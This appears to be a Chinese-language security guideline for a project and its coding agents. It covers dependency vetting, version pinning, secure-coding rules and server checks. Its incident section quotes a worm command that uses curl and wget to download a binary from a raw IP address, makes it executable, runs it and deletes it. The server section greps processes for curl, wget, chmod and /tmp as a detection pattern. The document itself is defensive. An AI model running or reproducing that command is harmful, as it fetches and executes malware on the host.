# 安全规范 🔒

> 从 `AGENTS.md §1` 拆出（2026-05-31, Agent Operating Harness Phase 2,见 [`docs/design-agent-operating-harness.md`](design-agent-operating-harness.md)）。`AGENTS.md` 现在只留章节导航,本文件是本章权威全文 —— 硬规范裁判权不变。


### 1.1 依赖安全

**强制要求：**
- 所有第三方依赖必须使用 **稳定版本**，禁止使用 alpha/beta/rc 版本
- 引入新依赖前必须检查：
  - 在 [Snyk](https://snyk.io/vuln/) 或 [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit) 查询已知漏洞
  - 检查 GitHub Issues 中的安全相关问题
  - 查看最近的更新频率（超过 1 年未更新的谨慎使用）
  - 检查依赖的下载量和社区活跃度

**历史安全事件警示：**
```bash
# 2026年1月 Next.js v15.1.3 蠕虫入侵事件
# 攻击命令：
/bin/sh -c cd /tmp;curl -o wlbo http://87.121.84.51/catgirl.x86;wget http://87.121.84.51/catgirl.x86 -O wlbo;chmod 777 wlbo;./wlbo misc.nextjs;rm wlbo

# 受影响版本：next-server (v15.1.3)
# 解决方案：立即升级到安全版本，并重装受感染服务器
```

**版本锁定策略：**
```json
// package.json - 使用精确版本，避免自动升级到有漏洞的版本
{
  "dependencies": {
    "next": "15.1.4",  // 精确版本，不用 ^15.1.4
    "react": "18.3.1"
  }
}
```

```txt
# requirements.txt - Python 同样使用精确版本
fastapi==0.115.0
uvicorn==0.32.0
sqlalchemy==2.0.25
```

### 1.2 代码安全

**禁止行为：**
- ❌ 禁止在代码中硬编码密钥、密码、Token
- ❌ 禁止使用 `eval()`、`exec()` 执行动态代码
- ❌ 禁止直接拼接 SQL 语句（使用 ORM 或参数化查询）
- ❌ 禁止信任用户输入（必须验证和清洗）
- ❌ 禁止在日志中打印敏感信息（密码、Token、个人数据）

**必须行为：**
- ✅ 所有密钥通过环境变量或密钥管理服务获取
- ✅ 用户输入必须经过 Pydantic 模型验证
- ✅ 文件上传必须验证类型、大小、内容
- ✅ API 接口必须有认证和授权检查
- ✅ 敏感操作必须记录审计日志

### 1.3 服务器安全

```bash
# 定期检查可疑进程
ps aux | grep -E "(curl|wget|chmod|/tmp/)" | grep -v grep

# 检查 /tmp 目录异常文件
ls -la /tmp/

# 检查异常网络连接
netstat -tulpn | grep -v 127.0.0.1

# 检查 crontab 是否被篡改
crontab -l
cat /etc/crontab
```

---
